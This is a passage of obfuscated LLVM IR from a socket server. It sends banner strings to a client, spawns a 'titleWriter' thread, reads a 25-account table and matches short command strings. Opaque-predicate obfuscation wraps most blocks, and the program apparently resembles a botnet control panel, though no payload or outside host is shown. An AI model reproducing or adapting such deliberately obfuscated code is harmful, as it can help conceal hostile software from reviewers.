  %671 = call i32 (i8*, i8*, ...) @sprintf(i8* %670, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.41, i32 0, i32 0)) #7
  %672 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i32 0, i32 0
  %673 = call i32 (i8*, i8*, ...) @sprintf(i8* %672, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.42, i32 0, i32 0)) #7
  %674 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i32 0, i32 0
  %675 = call i32 (i8*, i8*, ...) @sprintf(i8* %674, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.43, i32 0, i32 0)) #7
  %676 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i32 0, i32 0
  %677 = call i32 (i8*, i8*, ...) @sprintf(i8* %676, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.44, i32 0, i32 0)) #7
  %678 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i32 0, i32 0
  %679 = call i32 (i8*, i8*, ...) @sprintf(i8* %678, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.45, i32 0, i32 0)) #7
  %680 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i32 0, i32 0
  %681 = call i32 (i8*, i8*, ...) @sprintf(i8* %680, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.46, i32 0, i32 0)) #7
  %682 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i32 0, i32 0
  %683 = call i32 (i8*, i8*, ...) @sprintf(i8* %682, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.47, i32 0, i32 0)) #7
  %684 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i32 0, i32 0
  %685 = call i32 (i8*, i8*, ...) @sprintf(i8* %684, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %686 = load i32, i32* %4, align 4
  %687 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %688 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %689 = call i64 @strlen(i8* %688) #8
  %690 = call i64 @send(i32 %686, i8* %687, i64 %689, i32 16384)
  %691 = icmp eq i64 %690, -1
  %692 = load i32, i32* @x.17
  %693 = load i32, i32* @y.18
  %694 = sub i32 %692, 1
  %695 = mul i32 %692, %694
  %696 = urem i32 %695, 2
  %697 = icmp eq i32 %696, 0
  %698 = icmp slt i32 %693, 10
  %699 = or i1 %697, %698
  br i1 %699, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br i1 %691, label %700, label %701

; <label>:700:                                    ; preds = %originalBBpart272
  br label %4181

; <label>:701:                                    ; preds = %originalBBpart272
  %702 = load i32, i32* %4, align 4
  %703 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %704 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %705 = call i64 @strlen(i8* %704) #8
  %706 = call i64 @send(i32 %702, i8* %703, i64 %705, i32 16384)
  %707 = icmp eq i64 %706, -1
  br i1 %707, label %708, label %725

; <label>:708:                                    ; preds = %701
  %709 = load i32, i32* @x.17
  %710 = load i32, i32* @y.18
  %711 = sub i32 %709, 1
  %712 = mul i32 %709, %711
  %713 = urem i32 %712, 2
  %714 = icmp eq i32 %713, 0
  %715 = icmp slt i32 %710, 10
  %716 = or i1 %714, %715
  br i1 %716, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %708
  %717 = load i32, i32* @x.17
  %718 = load i32, i32* @y.18
  %719 = sub i32 %717, 1
  %720 = mul i32 %717, %719
  %721 = urem i32 %720, 2
  %722 = icmp eq i32 %721, 0
  %723 = icmp slt i32 %718, 10
  %724 = or i1 %722, %723
  br i1 %724, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br label %4181

; <label>:725:                                    ; preds = %701
  %726 = load i32, i32* @x.17
  %727 = load i32, i32* @y.18
  %728 = sub i32 %726, 1
  %729 = mul i32 %726, %728
  %730 = urem i32 %729, 2
  %731 = icmp eq i32 %730, 0
  %732 = icmp slt i32 %727, 10
  %733 = or i1 %731, %732
  br i1 %733, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %725
  %734 = load i32, i32* %4, align 4
  %735 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i32 0, i32 0
  %736 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i32 0, i32 0
  %737 = call i64 @strlen(i8* %736) #8
  %738 = call i64 @send(i32 %734, i8* %735, i64 %737, i32 16384)
  %739 = icmp eq i64 %738, -1
  %740 = load i32, i32* @x.17
  %741 = load i32, i32* @y.18
  %742 = sub i32 %740, 1
  %743 = mul i32 %740, %742
  %744 = urem i32 %743, 2
  %745 = icmp eq i32 %744, 0
  %746 = icmp slt i32 %741, 10
  %747 = or i1 %745, %746
  br i1 %747, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br i1 %739, label %748, label %749

; <label>:748:                                    ; preds = %originalBBpart280
  br label %4181

; <label>:749:                                    ; preds = %originalBBpart280
  %750 = load i32, i32* %4, align 4
  %751 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i32 0, i32 0
  %752 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i32 0, i32 0
  %753 = call i64 @strlen(i8* %752) #8
  %754 = call i64 @send(i32 %750, i8* %751, i64 %753, i32 16384)
  %755 = icmp eq i64 %754, -1
  br i1 %755, label %756, label %757

; <label>:756:                                    ; preds = %749
  br label %4181

; <label>:757:                                    ; preds = %749
  %758 = load i32, i32* %4, align 4
  %759 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i32 0, i32 0
  %760 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i32 0, i32 0
  %761 = call i64 @strlen(i8* %760) #8
  %762 = call i64 @send(i32 %758, i8* %759, i64 %761, i32 16384)
  %763 = icmp eq i64 %762, -1
  br i1 %763, label %764, label %781

; <label>:764:                                    ; preds = %757
  %765 = load i32, i32* @x.17
  %766 = load i32, i32* @y.18
  %767 = sub i32 %765, 1
  %768 = mul i32 %765, %767
  %769 = urem i32 %768, 2
  %770 = icmp eq i32 %769, 0
  %771 = icmp slt i32 %766, 10
  %772 = or i1 %770, %771
  br i1 %772, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %764
  %773 = load i32, i32* @x.17
  %774 = load i32, i32* @y.18
  %775 = sub i32 %773, 1
  %776 = mul i32 %773, %775
  %777 = urem i32 %776, 2
  %778 = icmp eq i32 %777, 0
  %779 = icmp slt i32 %774, 10
  %780 = or i1 %778, %779
  br i1 %780, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br label %4181

; <label>:781:                                    ; preds = %757
  %782 = load i32, i32* %4, align 4
  %783 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i32 0, i32 0
  %784 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i32 0, i32 0
  %785 = call i64 @strlen(i8* %784) #8
  %786 = call i64 @send(i32 %782, i8* %783, i64 %785, i32 16384)
  %787 = icmp eq i64 %786, -1
  br i1 %787, label %788, label %789

; <label>:788:                                    ; preds = %781
  br label %4181

; <label>:789:                                    ; preds = %781
  %790 = load i32, i32* %4, align 4
  %791 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i32 0, i32 0
  %792 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i32 0, i32 0
  %793 = call i64 @strlen(i8* %792) #8
  %794 = call i64 @send(i32 %790, i8* %791, i64 %793, i32 16384)
  %795 = icmp eq i64 %794, -1
  br i1 %795, label %796, label %813

; <label>:796:                                    ; preds = %789
  %797 = load i32, i32* @x.17
  %798 = load i32, i32* @y.18
  %799 = sub i32 %797, 1
  %800 = mul i32 %797, %799
  %801 = urem i32 %800, 2
  %802 = icmp eq i32 %801, 0
  %803 = icmp slt i32 %798, 10
  %804 = or i1 %802, %803
  br i1 %804, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %796
  %805 = load i32, i32* @x.17
  %806 = load i32, i32* @y.18
  %807 = sub i32 %805, 1
  %808 = mul i32 %805, %807
  %809 = urem i32 %808, 2
  %810 = icmp eq i32 %809, 0
  %811 = icmp slt i32 %806, 10
  %812 = or i1 %810, %811
  br i1 %812, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br label %4181

; <label>:813:                                    ; preds = %789
  %814 = load i32, i32* @x.17
  %815 = load i32, i32* @y.18
  %816 = sub i32 %814, 1
  %817 = mul i32 %814, %816
  %818 = urem i32 %817, 2
  %819 = icmp eq i32 %818, 0
  %820 = icmp slt i32 %815, 10
  %821 = or i1 %819, %820
  br i1 %821, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %813
  %822 = load i32, i32* %4, align 4
  %823 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i32 0, i32 0
  %824 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i32 0, i32 0
  %825 = call i64 @strlen(i8* %824) #8
  %826 = call i64 @send(i32 %822, i8* %823, i64 %825, i32 16384)
  %827 = icmp eq i64 %826, -1
  %828 = load i32, i32* @x.17
  %829 = load i32, i32* @y.18
  %830 = sub i32 %828, 1
  %831 = mul i32 %828, %830
  %832 = urem i32 %831, 2
  %833 = icmp eq i32 %832, 0
  %834 = icmp slt i32 %829, 10
  %835 = or i1 %833, %834
  br i1 %835, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br i1 %827, label %836, label %837

; <label>:836:                                    ; preds = %originalBBpart292
  br label %4181

; <label>:837:                                    ; preds = %originalBBpart292
  %838 = load i32, i32* %4, align 4
  %839 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i32 0, i32 0
  %840 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i32 0, i32 0
  %841 = call i64 @strlen(i8* %840) #8
  %842 = call i64 @send(i32 %838, i8* %839, i64 %841, i32 16384)
  %843 = icmp eq i64 %842, -1
  br i1 %843, label %844, label %861

; <label>:844:                                    ; preds = %837
  %845 = load i32, i32* @x.17
  %846 = load i32, i32* @y.18
  %847 = sub i32 %845, 1
  %848 = mul i32 %845, %847
  %849 = urem i32 %848, 2
  %850 = icmp eq i32 %849, 0
  %851 = icmp slt i32 %846, 10
  %852 = or i1 %850, %851
  br i1 %852, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %844
  %853 = load i32, i32* @x.17
  %854 = load i32, i32* @y.18
  %855 = sub i32 %853, 1
  %856 = mul i32 %853, %855
  %857 = urem i32 %856, 2
  %858 = icmp eq i32 %857, 0
  %859 = icmp slt i32 %854, 10
  %860 = or i1 %858, %859
  br i1 %860, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br label %4181

; <label>:861:                                    ; preds = %837
  %862 = load i32, i32* %4, align 4
  %863 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i32 0, i32 0
  %864 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i32 0, i32 0
  %865 = call i64 @strlen(i8* %864) #8
  %866 = call i64 @send(i32 %862, i8* %863, i64 %865, i32 16384)
  %867 = icmp eq i64 %866, -1
  br i1 %867, label %868, label %869

; <label>:868:                                    ; preds = %861
  br label %4181

; <label>:869:                                    ; preds = %861
  %870 = load i32, i32* %4, align 4
  %871 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i32 0, i32 0
  %872 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i32 0, i32 0
  %873 = call i64 @strlen(i8* %872) #8
  %874 = call i64 @send(i32 %870, i8* %871, i64 %873, i32 16384)
  %875 = icmp eq i64 %874, -1
  br i1 %875, label %876, label %877

; <label>:876:                                    ; preds = %869
  br label %4181

; <label>:877:                                    ; preds = %869
  %878 = load i8*, i8** %3, align 8
  %879 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %878) #7
  br label %880

; <label>:880:                                    ; preds = %877
  %881 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %882 = load i32, i32* %5, align 4
  %883 = sext i32 %882 to i64
  %884 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %883
  %885 = getelementptr inbounds %struct.account, %struct.account* %884, i32 0, i32 0
  %886 = getelementptr inbounds [20 x i8], [20 x i8]* %885, i32 0, i32 0
  %887 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %888 = call i32 (i8*, i8*, ...) @sprintf(i8* %881, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %886, i8* %887) #7
  %889 = load i32, i32* %4, align 4
  %890 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %891 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %892 = call i64 @strlen(i8* %891) #8
  %893 = call i64 @send(i32 %889, i8* %890, i64 %892, i32 16384)
  %894 = icmp eq i64 %893, -1
  br i1 %894, label %895, label %896

; <label>:895:                                    ; preds = %880
  br label %4181

; <label>:896:                                    ; preds = %880
  br label %897

; <label>:897:                                    ; preds = %896
  %898 = load i32, i32* @x.17
  %899 = load i32, i32* @y.18
  %900 = sub i32 %898, 1
  %901 = mul i32 %898, %900
  %902 = urem i32 %901, 2
  %903 = icmp eq i32 %902, 0
  %904 = icmp slt i32 %899, 10
  %905 = or i1 %903, %904
  br i1 %905, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %897
  %906 = load i32, i32* @x.17
  %907 = load i32, i32* @y.18
  %908 = sub i32 %906, 1
  %909 = mul i32 %906, %908
  %910 = urem i32 %909, 2
  %911 = icmp eq i32 %910, 0
  %912 = icmp slt i32 %907, 10
  %913 = or i1 %911, %912
  br i1 %913, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br label %561

; <label>:914:                                    ; preds = %651
  %915 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %916 = call i8* @strstr(i8* %915, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.48, i32 0, i32 0)) #8
  %917 = icmp ne i8* %916, null
  br i1 %917, label %962, label %918

; <label>:918:                                    ; preds = %914
  %919 = load i32, i32* @x.17
  %920 = load i32, i32* @y.18
  %921 = sub i32 %919, 1
  %922 = mul i32 %919, %921
  %923 = urem i32 %922, 2
  %924 = icmp eq i32 %923, 0
  %925 = icmp slt i32 %920, 10
  %926 = or i1 %924, %925
  br i1 %926, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %918
  %927 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %928 = call i8* @strstr(i8* %927, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.49, i32 0, i32 0)) #8
  %929 = icmp ne i8* %928, null
  %930 = load i32, i32* @x.17
  %931 = load i32, i32* @y.18
  %932 = sub i32 %930, 1
  %933 = mul i32 %930, %932
  %934 = urem i32 %933, 2
  %935 = icmp eq i32 %934, 0
  %936 = icmp slt i32 %931, 10
  %937 = or i1 %935, %936
  br i1 %937, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br i1 %929, label %962, label %938

; <label>:938:                                    ; preds = %originalBBpart2104
  %939 = load i32, i32* @x.17
  %940 = load i32, i32* @y.18
  %941 = sub i32 %939, 1
  %942 = mul i32 %939, %941
  %943 = urem i32 %942, 2
  %944 = icmp eq i32 %943, 0
  %945 = icmp slt i32 %940, 10
  %946 = or i1 %944, %945
  br i1 %946, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %938
  %947 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %948 = call i8* @strstr(i8* %947, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.50, i32 0, i32 0)) #8
  %949 = icmp ne i8* %948, null
  %950 = load i32, i32* @x.17
  %951 = load i32, i32* @y.18
  %952 = sub i32 %950, 1
  %953 = mul i32 %950, %952
  %954 = urem i32 %953, 2
  %955 = icmp eq i32 %954, 0
  %956 = icmp slt i32 %951, 10
  %957 = or i1 %955, %956
  br i1 %957, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %949, label %962, label %958

; <label>:958:                                    ; preds = %originalBBpart2108
  %959 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %960 = call i8* @strstr(i8* %959, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.51, i32 0, i32 0)) #8
  %961 = icmp ne i8* %960, null
  br i1 %961, label %962, label %1165

; <label>:962:                                    ; preds = %958, %originalBBpart2108, %originalBBpart2104, %914
  %963 = load i32, i32* @x.17
  %964 = load i32, i32* @y.18
  %965 = sub i32 %963, 1
  %966 = mul i32 %963, %965
  %967 = urem i32 %966, 2
  %968 = icmp eq i32 %967, 0
  %969 = icmp slt i32 %964, 10
  %970 = or i1 %968, %969
  br i1 %970, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %962
  %971 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i32 0, i32 0
  %972 = call i32 (i8*, i8*, ...) @sprintf(i8* %971, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.52, i32 0, i32 0)) #7
  %973 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i32 0, i32 0
  %974 = call i32 (i8*, i8*, ...) @sprintf(i8* %973, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %975 = getelementptr inbounds [5000 x i8], [5000 x i8]* %37, i32 0, i32 0
  %976 = call i32 (i8*, i8*, ...) @sprintf(i8* %975, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.53, i32 0, i32 0)) #7
  %977 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i32 0, i32 0
  %978 = call i32 (i8*, i8*, ...) @sprintf(i8* %977, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.54, i32 0, i32 0)) #7
  %979 = getelementptr inbounds [5000 x i8], [5000 x i8]* %39, i32 0, i32 0
  %980 = call i32 (i8*, i8*, ...) @sprintf(i8* %979, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.55, i32 0, i32 0)) #7
  %981 = getelementptr inbounds [5000 x i8], [5000 x i8]* %40, i32 0, i32 0
  %982 = call i32 (i8*, i8*, ...) @sprintf(i8* %981, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.56, i32 0, i32 0)) #7
  %983 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i32 0, i32 0
  %984 = call i32 (i8*, i8*, ...) @sprintf(i8* %983, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %985 = load i32, i32* %4, align 4
  %986 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i32 0, i32 0
  %987 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i32 0, i32 0
  %988 = call i64 @strlen(i8* %987) #8
  %989 = call i64 @send(i32 %985, i8* %986, i64 %988, i32 16384)
  %990 = icmp eq i64 %989, -1
  %991 = load i32, i32* @x.17
  %992 = load i32, i32* @y.18
  %993 = sub i32 %991, 1
  %994 = mul i32 %991, %993
  %995 = urem i32 %994, 2
  %996 = icmp eq i32 %995, 0
  %997 = icmp slt i32 %992, 10
  %998 = or i1 %996, %997
  br i1 %998, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br i1 %990, label %999, label %1000

; <label>:999:                                    ; preds = %originalBBpart2112
  br label %4181

; <label>:1000:                                   ; preds = %originalBBpart2112
  %1001 = load i32, i32* %4, align 4
  %1002 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i32 0, i32 0
  %1003 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i32 0, i32 0
  %1004 = call i64 @strlen(i8* %1003) #8
  %1005 = call i64 @send(i32 %1001, i8* %1002, i64 %1004, i32 16384)
  %1006 = icmp eq i64 %1005, -1
  br i1 %1006, label %1007, label %1024

; <label>:1007:                                   ; preds = %1000
  %1008 = load i32, i32* @x.17
  %1009 = load i32, i32* @y.18
  %1010 = sub i32 %1008, 1
  %1011 = mul i32 %1008, %1010
  %1012 = urem i32 %1011, 2
  %1013 = icmp eq i32 %1012, 0
  %1014 = icmp slt i32 %1009, 10
  %1015 = or i1 %1013, %1014
  br i1 %1015, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %1007
  %1016 = load i32, i32* @x.17
  %1017 = load i32, i32* @y.18
  %1018 = sub i32 %1016, 1
  %1019 = mul i32 %1016, %1018
  %1020 = urem i32 %1019, 2
  %1021 = icmp eq i32 %1020, 0
  %1022 = icmp slt i32 %1017, 10
  %1023 = or i1 %1021, %1022
  br i1 %1023, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br label %4181

; <label>:1024:                                   ; preds = %1000
  %1025 = load i32, i32* %4, align 4
  %1026 = getelementptr inbounds [5000 x i8], [5000 x i8]* %37, i32 0, i32 0
  %1027 = getelementptr inbounds [5000 x i8], [5000 x i8]* %37, i32 0, i32 0
  %1028 = call i64 @strlen(i8* %1027) #8
  %1029 = call i64 @send(i32 %1025, i8* %1026, i64 %1028, i32 16384)
  %1030 = icmp eq i64 %1029, -1
  br i1 %1030, label %1031, label %1032

; <label>:1031:                                   ; preds = %1024
  br label %4181

; <label>:1032:                                   ; preds = %1024
  %1033 = load i32, i32* %4, align 4
  %1034 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i32 0, i32 0
  %1035 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i32 0, i32 0
  %1036 = call i64 @strlen(i8* %1035) #8
  %1037 = call i64 @send(i32 %1033, i8* %1034, i64 %1036, i32 16384)
  %1038 = icmp eq i64 %1037, -1
  br i1 %1038, label %1039, label %1040

; <label>:1039:                                   ; preds = %1032
  br label %4181

; <label>:1040:                                   ; preds = %1032
  %1041 = load i32, i32* %4, align 4
  %1042 = getelementptr inbounds [5000 x i8], [5000 x i8]* %39, i32 0, i32 0
  %1043 = getelementptr inbounds [5000 x i8], [5000 x i8]* %39, i32 0, i32 0
  %1044 = call i64 @strlen(i8* %1043) #8
  %1045 = call i64 @send(i32 %1041, i8* %1042, i64 %1044, i32 16384)
  %1046 = icmp eq i64 %1045, -1
  br i1 %1046, label %1047, label %1048

; <label>:1047:                                   ; preds = %1040
  br label %4181

; <label>:1048:                                   ; preds = %1040
  %1049 = load i32, i32* %4, align 4
  %1050 = getelementptr inbounds [5000 x i8], [5000 x i8]* %40, i32 0, i32 0
  %1051 = getelementptr inbounds [5000 x i8], [5000 x i8]* %40, i32 0, i32 0
  %1052 = call i64 @strlen(i8* %1051) #8
  %1053 = call i64 @send(i32 %1049, i8* %1050, i64 %1052, i32 16384)
  %1054 = icmp eq i64 %1053, -1
  br i1 %1054, label %1055, label %1072

; <label>:1055:                                   ; preds = %1048
  %1056 = load i32, i32* @x.17
  %1057 = load i32, i32* @y.18
  %1058 = sub i32 %1056, 1
  %1059 = mul i32 %1056, %1058
  %1060 = urem i32 %1059, 2
  %1061 = icmp eq i32 %1060, 0
  %1062 = icmp slt i32 %1057, 10
  %1063 = or i1 %1061, %1062
  br i1 %1063, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %1055
  %1064 = load i32, i32* @x.17
  %1065 = load i32, i32* @y.18
  %1066 = sub i32 %1064, 1
  %1067 = mul i32 %1064, %1066
  %1068 = urem i32 %1067, 2
  %1069 = icmp eq i32 %1068, 0
  %1070 = icmp slt i32 %1065, 10
  %1071 = or i1 %1069, %1070
  br i1 %1071, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br label %4181

; <label>:1072:                                   ; preds = %1048
  %1073 = load i32, i32* @x.17
  %1074 = load i32, i32* @y.18
  %1075 = sub i32 %1073, 1
  %1076 = mul i32 %1073, %1075
  %1077 = urem i32 %1076, 2
  %1078 = icmp eq i32 %1077, 0
  %1079 = icmp slt i32 %1074, 10
  %1080 = or i1 %1078, %1079
  br i1 %1080, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %1072
  %1081 = load i32, i32* %4, align 4
  %1082 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i32 0, i32 0
  %1083 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i32 0, i32 0
  %1084 = call i64 @strlen(i8* %1083) #8
  %1085 = call i64 @send(i32 %1081, i8* %1082, i64 %1084, i32 16384)
  %1086 = icmp eq i64 %1085, -1
  %1087 = load i32, i32* @x.17
  %1088 = load i32, i32* @y.18
  %1089 = sub i32 %1087, 1
  %1090 = mul i32 %1087, %1089
  %1091 = urem i32 %1090, 2
  %1092 = icmp eq i32 %1091, 0
  %1093 = icmp slt i32 %1088, 10
  %1094 = or i1 %1092, %1093
  br i1 %1094, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br i1 %1086, label %1095, label %1112

; <label>:1095:                                   ; preds = %originalBBpart2124
  %1096 = load i32, i32* @x.17
  %1097 = load i32, i32* @y.18
  %1098 = sub i32 %1096, 1
  %1099 = mul i32 %1096, %1098
  %1100 = urem i32 %1099, 2
  %1101 = icmp eq i32 %1100, 0
  %1102 = icmp slt i32 %1097, 10
  %1103 = or i1 %1101, %1102
  br i1 %1103, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %1095
  %1104 = load i32, i32* @x.17
  %1105 = load i32, i32* @y.18
  %1106 = sub i32 %1104, 1
  %1107 = mul i32 %1104, %1106
  %1108 = urem i32 %1107, 2
  %1109 = icmp eq i32 %1108, 0
  %1110 = icmp slt i32 %1105, 10
  %1111 = or i1 %1109, %1110
  br i1 %1111, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br label %4181

; <label>:1112:                                   ; preds = %originalBBpart2124
  %1113 = load i32, i32* @x.17
  %1114 = load i32, i32* @y.18
  %1115 = sub i32 %1113, 1
  %1116 = mul i32 %1113, %1115
  %1117 = urem i32 %1116, 2
  %1118 = icmp eq i32 %1117, 0
  %1119 = icmp slt i32 %1114, 10
  %1120 = or i1 %1118, %1119
  br i1 %1120, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %1112
  %1121 = load i8*, i8** %3, align 8
  %1122 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1121) #7
  %1123 = load i32, i32* @x.17
  %1124 = load i32, i32* @y.18
  %1125 = sub i32 %1123, 1
  %1126 = mul i32 %1123, %1125
  %1127 = urem i32 %1126, 2
  %1128 = icmp eq i32 %1127, 0
  %1129 = icmp slt i32 %1124, 10
  %1130 = or i1 %1128, %1129
  br i1 %1130, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br label %1131

; <label>:1131:                                   ; preds = %originalBBpart2132
  %1132 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1133 = load i32, i32* %5, align 4
  %1134 = sext i32 %1133 to i64
  %1135 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1134
  %1136 = getelementptr inbounds %struct.account, %struct.account* %1135, i32 0, i32 0
  %1137 = getelementptr inbounds [20 x i8], [20 x i8]* %1136, i32 0, i32 0
  %1138 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1139 = call i32 (i8*, i8*, ...) @sprintf(i8* %1132, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %1137, i8* %1138) #7
  %1140 = load i32, i32* %4, align 4
  %1141 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1142 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1143 = call i64 @strlen(i8* %1142) #8
  %1144 = call i64 @send(i32 %1140, i8* %1141, i64 %1143, i32 16384)
  %1145 = icmp eq i64 %1144, -1
  br i1 %1145, label %1146, label %1147

; <label>:1146:                                   ; preds = %1131
  br label %4181

; <label>:1147:                                   ; preds = %1131
  %1148 = load i32, i32* @x.17
  %1149 = load i32, i32* @y.18
  %1150 = sub i32 %1148, 1
  %1151 = mul i32 %1148, %1150
  %1152 = urem i32 %1151, 2
  %1153 = icmp eq i32 %1152, 0
  %1154 = icmp slt i32 %1149, 10
  %1155 = or i1 %1153, %1154
  br i1 %1155, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %1147
  %1156 = load i32, i32* @x.17
  %1157 = load i32, i32* @y.18
  %1158 = sub i32 %1156, 1
  %1159 = mul i32 %1156, %1158
  %1160 = urem i32 %1159, 2
